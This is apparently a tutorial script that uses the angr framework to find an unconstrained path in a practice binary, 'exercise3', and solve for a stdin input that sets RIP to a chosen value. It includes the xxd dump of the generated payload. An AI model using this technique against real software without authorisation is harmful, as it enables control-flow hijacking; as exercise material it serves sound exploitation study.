import angr
import claripy
import logging

"""
Verbose logging messages to watch the progress of the path_group
"""
logging.getLogger('angr.path_group').setLevel(logging.DEBUG)

"""
Load the demo3 binary into angr
"""
proj = angr.Project('exercise3', load_options={'auto_load_libs': False})

"""
Start angr analysis at the entry point of the binary
"""
state = proj.factory.entry_state()

"""
By default, angr discards paths that are unconstrained. Since this is
exactly what we are aiming for in an exploitation example, we want to
save these paths for analysis.
"""
pg = proj.factory.path_group(state, save_unconstrained=True)

"""
Instead of the normal `.explore` function, we are going to single step
through each path with a unique function that will stop whenever we have found
one unconstrained path.
"""
pg.step(until=lambda x: len(x.unconstrained) > 0)

"""
Extract our path with an unconstrained execution (aka symbolic instruction pointer)
"""
state = pg.unconstrained[0].state

"""
Now that we have an unconstrained path, we can tell the solver that
we want to set RIP to 0xdeadbeefcafebabe. For this, we create a BitVector
(Z3 variable) to hold our 0xdeadbeefcafebabe
"""
crash_ip = claripy.BVV(int('deadbeefcafebabe', 16), 8 * 8)

"""
We then simply add the constraint to the symbolic solver such that our RIP
at the currently position in the path is 0xdeadbeefcafebabe
"""
state.se.add(state.regs.ip == crash_ip)

# Solve the stdin for our wanted RIP
payload = state.posix.dumps(0)

with open('solution', 'wb') as f:
    f.write(payload)

"""
$ xxd solution
0000000: 7469 6d65 5f32 5f73 6f6c 7665 5f61 6c6c  time_2_solve_all
0000010: 5f74 6865 5f74 6869 6e67 730a 0000 0000  _the_things.....
0000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000040: 0000 0000 0000 0000 beba feca efbe adde  ................
0000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
"""
